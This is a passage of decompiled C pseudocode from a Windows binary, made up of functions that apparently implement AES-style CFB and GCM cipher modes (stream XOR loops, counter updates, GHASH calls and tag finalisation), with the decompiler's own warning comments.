        int a7,
        void (__fastcall *a8)(__int128 *, __int128 *, __int64))
{
  void (__fastcall *v8)(__int128 *, __int128 *, __int64); // r10
  unsigned __int64 v9; // rdi
  __int64 v12; // rdx
  signed __int64 v13; // r14
  unsigned __int64 v14; // r15
  char v15; // bl
  char v16; // al
  __int64 v17; // r11
  unsigned __int8 *v18; // r10
  char v19; // r9
  unsigned __int8 v20; // dl
  char v21; // r8
  __int16 v22; // kr02_2
  int v23; // r8d
  char v24; // cl
  __int64 v26; // [rsp+28h] [rbp-80h]
  __int128 v27; // [rsp+38h] [rbp-70h] BYREF
  char v28; // [rsp+48h] [rbp-60h]

  v8 = a8;
  v9 = 0i64;
  v26 = a4;
  v12 = a1;
  if ( a3 )
  {
    v13 = (char *)a5 - ((char *)&v27 + 1);
    do
    {
      v14 = v9 >> 3;
      v27 = *a5;
      v15 = (*(_BYTE *)((v9 >> 3) + v12) & (unsigned __int8)(1 << (7 - (v9 & 7)))) != 0 ? 0x80 : 0;
      v8(a5, a5, a4);
      v16 = v15 ^ *(_BYTE *)a5;
      if ( a7 )
        v28 = v16;
      else
        v28 = v15;
      v17 = 0i64;
      do
      {
        v18 = (unsigned __int8 *)&v27 + v17 + 1;
        v17 += 4i64;
        v19 = 2 * *v18;
        v18[(char *)a5 - ((char *)&v27 + 1)] = (*v18 >> 7) | (2 * *((_BYTE *)&v27 + v18 - ((unsigned __int8 *)&v27 + 1)));
        v20 = v18[2];
        v21 = 2 * v18[1];
        v18[v13 + 1] = v19 | (v18[1] >> 7);
        v22 = 2 * v20;
        v18[v13 + 2] = v21 | HIBYTE(v22);
        v18[v13 + 3] = v22 | (v18[3] >> 7);
      }
      while ( v17 < 16 );
      a4 = v26;
      v8 = a8;
      v12 = a1;
      v23 = *(unsigned __int8 *)(v14 + a2) & ~(1 << (7 - (v9 & 7)));
      v24 = v9++ & 7;
      *(_BYTE *)(v14 + a2) = ((unsigned __int8)(v16 & 0x80) >> v24) | v23;
    }
    while ( v9 < a3 );
  }
}

//----- (0000000140091520) ----------------------------------------------------
char __fastcall sub_140091520(
        char *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        _OWORD *a5,
        int a6,
        int a7,
        void (__fastcall *a8)(_OWORD *, _OWORD *, __int64))
{
  __int64 v8; // rsi
  __int64 v10; // rbp
  char *v11; // rbx
  char result; // al
  char v13; // cl
  _BYTE v14[17]; // [rsp+20h] [rbp-58h]

  if ( a3 )
  {
    v8 = a2 - (_QWORD)a1;
    v10 = a3;
    v11 = a1;
    do
    {
      *(_OWORD *)v14 = *a5;
      a8(a5, a5, a4);
      if ( a7 )
      {
        result = *v11;
        v13 = *v11 ^ *(_BYTE *)a5;
        v11[v8] = v13;
      }
      else
      {
        v13 = *v11;
        result = *v11 ^ *(_BYTE *)a5;
        v11[v8] = result;
      }
      v14[16] = v13;
      ++v11;
      *a5 = *(_OWORD *)&v14[1];
      --v10;
    }
    while ( v10 );
  }
  return result;
}

//----- (00000001400915F0) ----------------------------------------------------
char __fastcall sub_1400915F0(
        _BYTE *a1,
        _BYTE *a2,
        unsigned __int64 a3,
        __int64 a4,
        __int64 a5,
        unsigned int *a6,
        int a7,
        __int64 (__fastcall *a8)(__int64, __int64, __int64))
{
  __int64 v8; // r10
  unsigned int *v9; // r15
  unsigned int v13; // ebx
  __int64 v14; // rax
  char v15; // dl
  __int64 (__fastcall *v16)(__int64, __int64, __int64); // r9
  unsigned __int64 v17; // r13
  _BYTE *v18; // r15
  _BYTE *v19; // r12
  __int64 *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rdx
  char v23; // cl
  char v24; // dl
  unsigned __int64 v25; // r12
  _BYTE *v26; // r15
  __int64 *v27; // r8
  __int64 v28; // r9
  __int64 v29; // rax
  __int64 *v30; // rcx
  __int64 v31; // rdx
  __int64 v32; // rcx
  char v33; // dl
  _BYTE *v35; // [rsp+68h] [rbp+10h]

  v8 = a4;
  v9 = a6;
  v13 = *a6;
  if ( a7 )
  {
    for ( ; v13; v13 = ((_BYTE)v13 + 1) & 0xF )
    {
      if ( !a3 )
        break;
      LOBYTE(v14) = *a1;
      --a3;
      ++a1;
      v15 = v14 ^ *(_BYTE *)(v13 + a5);
      *(_BYTE *)(v13 + a5) = v15;
      *a2++ = v15;
    }
    v16 = a8;
    if ( a3 >= 0x10 )
    {
      v17 = a3 >> 4;
      v18 = &a2[-a5];
      v19 = &a1[-a5];
      a3 += -16i64 * (a3 >> 4);
      v35 = &a2[16 * v17];
      a1 += 16 * v17;
      do
      {
        LOBYTE(v14) = v16(a5, a5, a4);
        if ( v13 < 0x10 )
        {
          v20 = (__int64 *)(a5 + v13);
          v21 = ((15 - v13) >> 3) + 1;
          do
          {
            *v20 ^= *(__int64 *)((char *)v20 + (_QWORD)v19);
            v14 = *v20;
            *(__int64 *)((char *)v20 + (_QWORD)v18) = *v20;
            ++v20;
            --v21;
          }
          while ( v21 );
        }
        v16 = a8;
        v18 += 16;
        v19 += 16;
        v13 = 0;
        --v17;
      }
      while ( v17 );
      a2 = v35;
      v8 = a4;
      v9 = a6;
    }
    if ( a3 )
    {
      v16(a5, a5, v8);
      do
      {
        v22 = v13++;
        LOBYTE(v14) = *(_BYTE *)(v22 + a5);
        v23 = v14 ^ a1[v22];
        *(_BYTE *)(v22 + a5) = v23;
        a2[v22] = v23;
        --a3;
      }
      while ( a3 );
    }
  }
  else
  {
    for ( ; v13; v13 = ((_BYTE)v13 + 1) & 0xF )
    {
      if ( !a3 )
        break;
      v24 = *a1;
      --a3;
      ++a1;
      LOBYTE(v14) = v24 ^ *(_BYTE *)(v13 + a5);
      *a2++ = v14;
      *(_BYTE *)(v13 + a5) = v24;
    }
    if ( a3 >= 0x10 )
    {
      v25 = a3 >> 4;
      v26 = &a2[-a5];
      do
      {
        LOBYTE(v14) = a8(a5, a5, a4);
        if ( v13 < 0x10 )
        {
          v27 = (__int64 *)(a5 + v13);
          v28 = ((15 - v13) >> 3) + 1;
          do
          {
            v29 = *v27;
            v30 = (__int64 *)((char *)v27 + (_QWORD)v26);
            v31 = *(__int64 *)((char *)v27++ + (_QWORD)v26 + a1 - a2);
            v14 = v31 ^ v29;
            *v30 = v14;
            *(v27 - 1) = v31;
            --v28;
          }
          while ( v28 );
        }
        a2 += 16;
        v26 += 16;
        a1 += 16;
        v13 = 0;
        --v25;
      }
      while ( v25 );
      a3 += -16i64 * (a3 >> 4);
      v8 = a4;
      v9 = a6;
    }
    if ( a3 )
    {
      a8(a5, a5, v8);
      do
      {
        v32 = v13++;
        v33 = a1[v32];
        LOBYTE(v14) = v33 ^ *(_BYTE *)(v32 + a5);
        a2[v32] = v14;
        *(_BYTE *)(v32 + a5) = v33;
        --a3;
      }
      while ( a3 );
    }
  }
  *v9 = v13;
  return v14;
}
// 14009185E: variable 'v14' is possibly undefined

//----- (0000000140091880) ----------------------------------------------------
__int64 __fastcall sub_140091880(__int64 a1, char *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx
  unsigned __int64 v7; // rcx
  unsigned int v8; // edi
  char v9; // al
  unsigned __int64 v10; // rbp
  _BYTE *v11; // rcx
  char *v12; // r14

  v3 = a3;
  if ( *(_QWORD *)(a1 + 56) )
    return 4294967294i64;
  v7 = a3 + *(_QWORD *)(a1 + 48);
  if ( v7 > 0x2000000000000000i64 || v7 < a3 )
    return 0xFFFFFFFFi64;
  v8 = *(_DWORD *)(a1 + 372);
  *(_QWORD *)(a1 + 48) = v7;
  if ( v8 )
  {
    while ( v3 )
    {
      v9 = *a2;
      --v3;
      ++a2;
      *(_BYTE *)(v8 + a1 + 64) ^= v9;
      v8 = ((_BYTE)v8 + 1) & 0xF;
      if ( !v8 )
      {
        sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
        goto LABEL_10;
      }
    }
  }
  else
  {
LABEL_10:
    v10 = v3 & 0xFFFFFFFFFFFFFFF0ui64;
    if ( (v3 & 0xFFFFFFFFFFFFFFF0ui64) != 0 )
    {
      sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, (__int64)a2, v3 & 0xFFFFFFFFFFFFFFF0ui64);
      a2 += v10;
      v3 -= v10;
    }
    if ( v3 )
    {
      v8 = v3;
      v11 = (_BYTE *)(a1 + 64);
      v12 = &a2[-a1];
      do
      {
        *v11 ^= v11[(_QWORD)v12 - 64];
        ++v11;
        --v3;
      }
      while ( v3 );
    }
  }
  *(_DWORD *)(a1 + 372) = v8;
  return 0i64;
}
// 140091915: conditional instruction was optimized away because edi.4!=0

//----- (00000001400919B0) ----------------------------------------------------
__int64 __fastcall sub_1400919B0(__int64 a1, __int64 a2, _QWORD *a3, unsigned __int64 a4)
{
  unsigned __int64 v5; // r15
  unsigned __int64 v8; // rcx
  bool v9; // zf
  unsigned int v10; // ebp
  int v11; // edi
  char v12; // dl
  __int64 v13; // rcx
  _BYTE *v14; // r10
  __int64 v15; // r12
  __int64 v16; // rax
  unsigned __int64 v17; // r12
  __int64 v18; // rax
  int v19; // edi
  __int64 v20; // rdx
  char v21; // cl
  char v22; // al
  __int64 result; // rax
  __int64 v24; // [rsp+20h] [rbp-58h]
  void (__fastcall *v25)(__int64, __int64, __int64); // [rsp+28h] [rbp-50h]
  unsigned __int64 v26; // [rsp+30h] [rbp-48h]
  unsigned int v27; // [rsp+80h] [rbp+8h]

  v25 = *(void (__fastcall **)(__int64, __int64, __int64))(a1 + 376);
  v5 = a4;
  v24 = *(_QWORD *)(a1 + 384);
  v8 = a4 + *(_QWORD *)(a1 + 56);
  if ( v8 > 0xFFFFFFFE0i64 || v8 < a4 )
    return 0xFFFFFFFFi64;
  v9 = *(_DWORD *)(a1 + 372) == 0;
  *(_QWORD *)(a1 + 56) = v8;
  if ( !v9 )
  {
    sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
    *(_DWORD *)(a1 + 372) = 0;
  }
  v10 = *(_DWORD *)(a1 + 368);
  v27 = v10;
  v11 = *(unsigned __int8 *)(a1 + 15) | ((*(unsigned __int8 *)(a1 + 14) | ((*(unsigned __int8 *)(a1 + 13) | (*(unsigned __int8 *)(a1 + 12) << 8)) << 8)) << 8);
  if ( v10 )
  {
    while ( v5 )
    {
      v12 = *(_BYTE *)a2;
      --v5;
      ++a2;
      *(_BYTE *)a3 = v12 ^ *(_BYTE *)(v10 + a1 + 16);
      a3 = (_QWORD *)((char *)a3 + 1);
      *(_BYTE *)(v10 + a1 + 64) ^= v12;
      v10 = ((_BYTE)v10 + 1) & 0xF;
      v27 = v10;
      if ( !v10 )
      {
        sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
        goto LABEL_10;
      }
    }
    *(_DWORD *)(a1 + 368) = v10;
    return 0i64;
  }
  else
  {
LABEL_10:
    if ( v5 >= 0xC00 )
    {
      v13 = a1 + 96;
      v14 = (_BYTE *)(a1 + 64);
      v26 = v5 / 0xC00;
      do
      {
        sub_140092B10(v14, v13, a2, 3072i64);
        v15 = 192i64;
        do
        {
          v25(a1, a1 + 16, v24);
          *(_BYTE *)(a1 + 15) = ++v11;
          *(_BYTE *)(a1 + 12) = HIBYTE(v11);
          *(_BYTE *)(a1 + 13) = BYTE2(v11);
          *(_BYTE *)(a1 + 14) = BYTE1(v11);
          *a3 = *(_QWORD *)a2 ^ *(_QWORD *)(a1 + 16);
          v16 = *(_QWORD *)(a2 + 8);
          a2 += 16i64;
          a3[1] = *(_QWORD *)(a1 + 24) ^ v16;
          a3 += 2;
          --v15;
        }
        while ( v15 );
        v9 = v26-- == 1;
        v13 = a1 + 96;
        v14 = (_BYTE *)(a1 + 64);
      }
      while ( !v9 );
      v5 %= 0xC00ui64;
      v10 = v27;
    }
    if ( (v5 & 0xFFFFFFFFFFFFFFF0ui64) != 0 )
    {
      sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, a2, v5 & 0xFFFFFFFFFFFFFFF0ui64);
      if ( v5 >= 0x10 )
      {
        v17 = v5 >> 4;
        do
        {
          v25(a1, a1 + 16, v24);
          *(_BYTE *)(a1 + 15) = ++v11;
          *(_BYTE *)(a1 + 12) = HIBYTE(v11);
          *(_BYTE *)(a1 + 13) = BYTE2(v11);
          *(_BYTE *)(a1 + 14) = BYTE1(v11);
          *a3 = *(_QWORD *)a2 ^ *(_QWORD *)(a1 + 16);
          v18 = *(_QWORD *)(a2 + 8);
          a2 += 16i64;
          a3[1] = *(_QWORD *)(a1 + 24) ^ v18;
          a3 += 2;
          --v17;
        }
        while ( v17 );
        v5 += -16i64 * (v5 >> 4);
        v10 = v27;
      }
    }
    if ( v5 )
    {
      v25(a1, a1 + 16, v24);
      v19 = v11 + 1;
      *(_BYTE *)(a1 + 15) = v19;
      *(_BYTE *)(a1 + 12) = HIBYTE(v19);
      *(_BYTE *)(a1 + 13) = BYTE2(v19);
      *(_BYTE *)(a1 + 14) = BYTE1(v19);
      do
      {
        v20 = v10++;
        v21 = *(_BYTE *)(v20 + a2);
        v22 = *(_BYTE *)(a1 + v20 + 16);
        *(_BYTE *)(v20 + a1 + 64) ^= v21;
        *((_BYTE *)a3 + v20) = v21 ^ v22;
        --v5;
      }
      while ( v5 );
    }
    result = 0i64;
    *(_DWORD *)(a1 + 368) = v10;
  }
  return result;
}
// 140091AA3: conditional instruction was optimized away because ebp.4!=0

//----- (0000000140091CE0) ----------------------------------------------------
__int64 __fastcall sub_140091CE0(
        __int64 a1,
        char *a2,
        _BYTE *a3,
        unsigned __int64 a4,
        void (__fastcall *a5)(char *, _BYTE *, __int64, __int64, __int64))
{
  unsigned __int64 v6; // r14
  unsigned __int64 v7; // rcx
  bool v10; // zf
  unsigned int v11; // esi
  int v12; // ebp
  char v13; // dl
  unsigned __int64 v14; // rdi
  unsigned __int64 v15; // r13
  int v16; // ebp
  __int64 v17; // rdx
  char v18; // cl
  char v19; // al
  __int64 result; // rax
  __int64 v21; // [rsp+30h] [rbp-48h]
  unsigned int v22; // [rsp+80h] [rbp+8h]

  v6 = a4;
  v21 = *(_QWORD *)(a1 + 384);
  v7 = a4 + *(_QWORD *)(a1 + 56);
  if ( v7 > 0xFFFFFFFE0i64 || v7 < a4 )
    return 0xFFFFFFFFi64;
  v10 = *(_DWORD *)(a1 + 372) == 0;
  *(_QWORD *)(a1 + 56) = v7;
  if ( !v10 )
  {
    sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
    *(_DWORD *)(a1 + 372) = 0;
  }
  v11 = *(_DWORD *)(a1 + 368);
  v22 = v11;
  v12 = *(unsigned __int8 *)(a1 + 15) | ((*(unsigned __int8 *)(a1 + 14) | ((*(unsigned __int8 *)(a1 + 13) | (*(unsigned __int8 *)(a1 + 12) << 8)) << 8)) << 8);
  if ( v11 )
  {
    while ( v6 )
    {
      v13 = *a2;
      --v6;
      ++a2;
      *a3++ = v13 ^ *(_BYTE *)(v11 + a1 + 16);
      *(_BYTE *)(v11 + a1 + 64) ^= v13;
      v11 = ((_BYTE)v11 + 1) & 0xF;
      v22 = v11;
      if ( !v11 )
      {
        sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
        goto LABEL_10;
      }
    }
    *(_DWORD *)(a1 + 368) = v11;
    return 0i64;
  }
  else
  {
LABEL_10:
    if ( v6 >= 0xC00 )
    {
      v14 = v6 / 0xC00;
      v6 %= 0xC00ui64;
      do
      {
        sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, (__int64)a2, 3072i64);
        a5(a2, a3, 192i64, v21, a1);
        v12 += 192;
        a3 += 3072;
        *(_BYTE *)(a1 + 15) = v12;
        a2 += 3072;
        *(_BYTE *)(a1 + 12) = HIBYTE(v12);
        *(_BYTE *)(a1 + 13) = BYTE2(v12);
        *(_BYTE *)(a1 + 14) = BYTE1(v12);
        --v14;
      }
      while ( v14 );
      v11 = v22;
    }
    v15 = v6 & 0xFFFFFFFFFFFFFFF0ui64;
    if ( (v6 & 0xFFFFFFFFFFFFFFF0ui64) != 0 )
    {
      sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, (__int64)a2, v6 & 0xFFFFFFFFFFFFFFF0ui64);
      a5(a2, a3, v15 >> 4, v21, a1);
      v12 += v15 >> 4;
      a3 += v15;
      *(_BYTE *)(a1 + 15) = v12;
      a2 += v15;
      *(_BYTE *)(a1 + 12) = HIBYTE(v12);
      *(_BYTE *)(a1 + 13) = BYTE2(v12);
      *(_BYTE *)(a1 + 14) = BYTE1(v12);
      v6 -= v15;
    }
    if ( v6 )
    {
      (*(void (__fastcall **)(__int64, __int64, __int64))(a1 + 376))(a1, a1 + 16, v21);
      v16 = v12 + 1;
      *(_BYTE *)(a1 + 15) = v16;
      *(_BYTE *)(a1 + 12) = HIBYTE(v16);
      *(_BYTE *)(a1 + 13) = BYTE2(v16);
      *(_BYTE *)(a1 + 14) = BYTE1(v16);
      do
      {
        v17 = v11++;
        v18 = a2[v17];
        v19 = *(_BYTE *)(a1 + v17 + 16);
        *(_BYTE *)(v17 + a1 + 64) ^= v18;
        a3[v17] = v18 ^ v19;
        --v6;
      }
      while ( v6 );
    }
    result = 0i64;
    *(_DWORD *)(a1 + 368) = v11;
  }
  return result;
}
// 140091DC6: conditional instruction was optimized away because esi.4!=0

//----- (0000000140091F90) ----------------------------------------------------
__int64 __fastcall sub_140091F90(__int64 a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4)
{
  unsigned __int64 v5; // r14
  unsigned __int64 v8; // rcx
  bool v9; // zf
  unsigned int v10; // r15d
  int v11; // edi
  char v12; // al
  __int64 v13; // r12
  __int64 v14; // rax
  __int64 v15; // rax
  unsigned __int64 v16; // r12
  __int64 v17; // rax
  int v18; // edi
  __int64 v19; // rcx
  char v20; // dl
  __int64 result; // rax
  __int64 v22; // [rsp+20h] [rbp-58h]
  void (__fastcall *v23)(__int64, __int64, __int64); // [rsp+28h] [rbp-50h]
  unsigned __int64 v24; // [rsp+30h] [rbp-48h]
  unsigned __int64 v25; // [rsp+30h] [rbp-48h]
  unsigned int v26; // [rsp+80h] [rbp+8h]

  v23 = *(void (__fastcall **)(__int64, __int64, __int64))(a1 + 376);
  v5 = a4;
  v22 = *(_QWORD *)(a1 + 384);
  v8 = a4 + *(_QWORD *)(a1 + 56);
  if ( v8 > 0xFFFFFFFE0i64 || v8 < a4 )
    return 0xFFFFFFFFi64;
  v9 = *(_DWORD *)(a1 + 372) == 0;
  *(_QWORD *)(a1 + 56) = v8;
  if ( !v9 )
  {
    sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
    *(_DWORD *)(a1 + 372) = 0;
  }
  v10 = *(_DWORD *)(a1 + 368);
  v26 = v10;
  v11 = *(unsigned __int8 *)(a1 + 15) | ((*(unsigned __int8 *)(a1 + 14) | ((*(unsigned __int8 *)(a1 + 13) | (*(unsigned __int8 *)(a1 + 12) << 8)) << 8)) << 8);
  if ( v10 )
  {
    while ( v5 )
    {
      --v5;
      v12 = *(_BYTE *)a2 ^ *(_BYTE *)(v10 + a1 + 16);
      a2 = (_QWORD *)((char *)a2 + 1);
      *(_BYTE *)a3 = v12;
      a3 = (_QWORD *)((char *)a3 + 1);
      *(_BYTE *)(v10 + a1 + 64) ^= v12;
      v10 = ((_BYTE)v10 + 1) & 0xF;
      v26 = v10;
      if ( !v10 )
      {
        sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
        goto LABEL_10;
      }
    }
    *(_DWORD *)(a1 + 368) = v10;
    return 0i64;
  }
  else
  {
LABEL_10:
    if ( v5 >= 0xC00 )
    {
      v24 = v5 / 0xC00;
      do
      {
        v13 = 192i64;
        do
        {
          v23(a1, a1 + 16, v22);
          *(_BYTE *)(a1 + 15) = ++v11;
          *(_BYTE *)(a1 + 12) = HIBYTE(v11);
          *(_BYTE *)(a1 + 13) = BYTE2(v11);
          *(_BYTE *)(a1 + 14) = BYTE1(v11);
          *a3 = *a2 ^ *(_QWORD *)(a1 + 16);
          v14 = a2[1];
          a2 += 2;
          a3[1] = *(_QWORD *)(a1 + 24) ^ v14;
          a3 += 2;
          --v13;
        }
        while ( v13 );
        sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, (__int64)(a3 - 384), 3072i64);
        --v24;
      }
      while ( v24 );
      v5 %= 0xC00ui64;
      v10 = v26;
    }
    v15 = v5 & 0xFFFFFFFFFFFFFFF0ui64;
    v25 = v5 & 0xFFFFFFFFFFFFFFF0ui64;
    if ( (v5 & 0xFFFFFFFFFFFFFFF0ui64) != 0 )
    {
      if ( v5 >= 0x10 )
      {
        v16 = v5 >> 4;
        do
        {
          v23(a1, a1 + 16, v22);
          *(_BYTE *)(a1 + 15) = ++v11;
          *(_BYTE *)(a1 + 12) = HIBYTE(v11);
          *(_BYTE *)(a1 + 13) = BYTE2(v11);
          *(_BYTE *)(a1 + 14) = BYTE1(v11);
          *a3 = *a2 ^ *(_QWORD *)(a1 + 16);
          v17 = a2[1];
          a2 += 2;
          a3[1] = *(_QWORD *)(a1 + 24) ^ v17;
          a3 += 2;
          --v16;
        }
        while ( v16 );
        v5 += -16i64 * (v5 >> 4);
        v10 = v26;
        v15 = v25;
      }
      sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, (__int64)a3 - v15, v15);
    }
    if ( v5 )
    {
      v23(a1, a1 + 16, v22);
      v18 = v11 + 1;
      *(_BYTE *)(a1 + 15) = v18;
      *(_BYTE *)(a1 + 12) = HIBYTE(v18);
      *(_BYTE *)(a1 + 13) = BYTE2(v18);
      *(_BYTE *)(a1 + 14) = BYTE1(v18);
      do
      {
        v19 = v10++;
        v20 = *(_BYTE *)(a1 + v19 + 16) ^ *((_BYTE *)a2 + v19);
        *((_BYTE *)a3 + v19) = v20;
        *(_BYTE *)(v19 + a1 + 64) ^= v20;
        --v5;
      }
      while ( v5 );
    }
    result = 0i64;
    *(_DWORD *)(a1 + 368) = v10;
  }
  return result;
}
// 140092085: conditional instruction was optimized away because r15d.4!=0

//----- (00000001400922E0) ----------------------------------------------------
__int64 __fastcall sub_1400922E0(
        __int64 a1,
        _BYTE *a2,
        _BYTE *a3,
        unsigned __int64 a4,
        void (__fastcall *a5)(_BYTE *, _BYTE *, __int64, __int64, __int64))
{
  unsigned __int64 v6; // r14
  unsigned __int64 v7; // rcx
  bool v10; // zf
  unsigned int v11; // esi
  int v12; // ebp
  char v13; // al
  void (__fastcall *v14)(_BYTE *, _BYTE *, __int64, __int64, __int64); // r10
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // r13
  __int64 v17; // r9
  int v18; // ebp
  __int64 v19; // rcx
  char v20; // dl
  __int64 result; // rax
  __int64 v22; // [rsp+30h] [rbp-48h]
  unsigned int v23; // [rsp+80h] [rbp+8h]

  v6 = a4;
  v22 = *(_QWORD *)(a1 + 384);
  v7 = a4 + *(_QWORD *)(a1 + 56);
  if ( v7 > 0xFFFFFFFE0i64 || v7 < a4 )
    return 0xFFFFFFFFi64;
  v10 = *(_DWORD *)(a1 + 372) == 0;
  *(_QWORD *)(a1 + 56) = v7;
  if ( !v10 )
  {
    sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
    *(_DWORD *)(a1 + 372) = 0;
  }
  v11 = *(_DWORD *)(a1 + 368);
  v23 = v11;
  v12 = *(unsigned __int8 *)(a1 + 15) | ((*(unsigned __int8 *)(a1 + 14) | ((*(unsigned __int8 *)(a1 + 13) | (*(unsigned __int8 *)(a1 + 12) << 8)) << 8)) << 8);
  if ( v11 )
  {
    while ( v6 )
    {
      --v6;
      v13 = *a2++ ^ *(_BYTE *)(v11 + a1 + 16);
      *a3++ = v13;
      *(_BYTE *)(v11 + a1 + 64) ^= v13;
      v11 = ((_BYTE)v11 + 1) & 0xF;
      v23 = v11;
      if ( !v11 )
      {
        sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
        goto LABEL_10;
      }
    }
    *(_DWORD *)(a1 + 368) = v11;
    return 0i64;
  }
  else
  {
LABEL_10:
    v14 = a5;
    if ( v6 >= 0xC00 )
    {
      v15 = v6 / 0xC00;
      do
      {
        v14(a2, a3, 192i64, v22, a1);
        v12 += 192;
        *(_BYTE *)(a1 + 15) = v12;
        *(_BYTE *)(a1 + 12) = HIBYTE(v12);
        *(_BYTE *)(a1 + 13) = BYTE2(v12);
        *(_BYTE *)(a1 + 14) = BYTE1(v12);
        sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, (__int64)a3, 3072i64);
        v14 = a5;
        a3 += 3072;
        a2 += 3072;
        --v15;
      }
      while ( v15 );
      v11 = v23;
      v6 %= 0xC00ui64;
    }
    v16 = v6 & 0xFFFFFFFFFFFFFFF0ui64;
    if ( (v6 & 0xFFFFFFFFFFFFFFF0ui64) != 0 )
    {
      v14(a2, a3, v16 >> 4, v22, a1);
      v12 += v16 >> 4;
      *(_BYTE *)(a1 + 15) = v12;
      *(_BYTE *)(a1 + 12) = HIBYTE(v12);
      v17 = v6 & 0xFFFFFFFFFFFFFFF0ui64;
      a2 += v16;
      *(_BYTE *)(a1 + 13) = BYTE2(v12);
      v6 -= v16;
      *(_BYTE *)(a1 + 14) = BYTE1(v12);
      sub_140092B10((_BYTE *)(a1 + 64), a1 + 96, (__int64)a3, v17);
      a3 += v16;
    }
    if ( v6 )
    {
      (*(void (__fastcall **)(__int64, __int64, __int64))(a1 + 376))(a1, a1 + 16, v22);
      v18 = v12 + 1;
      *(_BYTE *)(a1 + 15) = v18;
      *(_BYTE *)(a1 + 12) = HIBYTE(v18);
      *(_BYTE *)(a1 + 13) = BYTE2(v18);
      *(_BYTE *)(a1 + 14) = BYTE1(v18);
      do
      {
        v19 = v11++;
        v20 = *(_BYTE *)(a1 + v19 + 16) ^ a2[v19];
        a3[v19] = v20;
        *(_BYTE *)(v19 + a1 + 64) ^= v20;
        --v6;
      }
      while ( v6 );
    }
    result = 0i64;
    *(_DWORD *)(a1 + 368) = v11;
  }
  return result;
}
// 1400923C3: conditional instruction was optimized away because esi.4!=0

//----- (00000001400925A0) ----------------------------------------------------
__int64 __fastcall sub_1400925A0(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v5; // rsi
  __int64 v7; // rbp
  unsigned __int64 v8; // rcx
  __int64 v9; // rax

  v5 = 8i64 * *(_QWORD *)(a1 + 48);
  v7 = 8i64 * *(_QWORD *)(a1 + 56);
  if ( *(_DWORD *)(a1 + 368) || *(_DWORD *)(a1 + 372) )
    sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
  *(_QWORD *)(a1 + 48) = v5;
  *(_QWORD *)(a1 + 56) = v7;
  v8 = *(unsigned __int8 *)(a1 + 62) | ((*(unsigned __int8 *)(a1 + 61) | ((*(unsigned __int8 *)(a1 + 60) | ((*(unsigned __int8 *)(a1 + 59) | ((*(unsigned __int8 *)(a1 + 58) | ((*(unsigned __int8 *)(a1 + 57) | ((unsigned __int64)(unsigned __int8)v7 << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  v9 = *(unsigned __int8 *)(a1 + 63);
  *(_QWORD *)(a1 + 64) ^= *(unsigned __int8 *)(a1 + 55) | ((*(unsigned __int8 *)(a1 + 54) | ((*(unsigned __int8 *)(a1 + 53) | ((*(unsigned __int8 *)(a1 + 52) | ((*(unsigned __int8 *)(a1 + 51) | ((*(unsigned __int8 *)(a1 + 50) | ((((unsigned __int64)(unsigned __int8)v5 << 8) | *(unsigned __int8 *)(a1 + 49)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  *(_QWORD *)(a1 + 72) ^= v9 | (v8 << 8);
  sub_140092CE0((_BYTE *)(a1 + 64), a1 + 96);
  *(_QWORD *)(a1 + 64) ^= *(_QWORD *)(a1 + 32);
  *(_QWORD *)(a1 + 72) ^= *(_QWORD *)(a1 + 40);
  if ( a2 && a3 <= 0x10 )
    return sub_140023460((char *)(a1 + 64), a2, a3);
  else
    return 0xFFFFFFFFi64;
}

//----- (0000000140092710) ----------------------------------------------------
unsigned __int64 __fastcall sub_140092710(
        __m128i *a1,
        __int64 a2,
        void (__fastcall *a3)(__m128i *, __m128i *, __int64))
{
  unsigned __int64 v6; // rcx

  memset(a1, 0, 0x188ui64);
  a1[23].m128i_i64[1] = (__int64)a3;
  a1[24].m128i_i64[0] = a2;
  a3(a1 + 5, a1 + 5, a2);
  v6 = a1[5].m128i_u8[7] | ((a1[5].m128i_u8[6] | ((a1[5].m128i_u8[5] | ((a1[5].m128i_u8[4] | ((a1[5].m128i_u8[3] | ((a1[5].m128i_u8[2] | ((a1[5].m128i_u8[1] | ((unsigned __int64)a1[5].m128i_u8[0] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  a1[5].m128i_i64[1] = a1[5].m128i_u8[15] | ((a1[5].m128i_u8[14] | ((a1[5].m128i_u8[13] | ((a1[5].m128i_u8[12] | ((a1[5].m128i_u8[11] | ((a1[5].m128i_u8[10] | ((a1[5].m128i_u8[9] | ((unsigned __int64)a1[5].m128i_u8[8] << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
  a1[5].m128i_i64[0] = v6;
  return sub_140092E50(a1 + 6, a1 + 5);
}

//----- (0000000140092830) ----------------------------------------------------
__int64 __fastcall sub_140092830(unsigned __int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r14
  unsigned __int64 v4; // rsi
  const __m128i *v5; // rdi
  int v7; // edi
  unsigned __int64 v8; // rbp
  unsigned __int64 v9; // rbp
  unsigned __int64 v10; // r15
  _BYTE *v11; // rax
  __int64 v12; // rdx
  const __m128i *v13; // rax
  __int8 *v14; // rcx
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __int8 *v17; // rdi
  _BYTE *v18; // rcx
  unsigned __int64 v19; // rsi
  __int64 v20; // rbp
  unsigned int v21; // edi
  __int64 result; // rax

  v3 = 0i64;
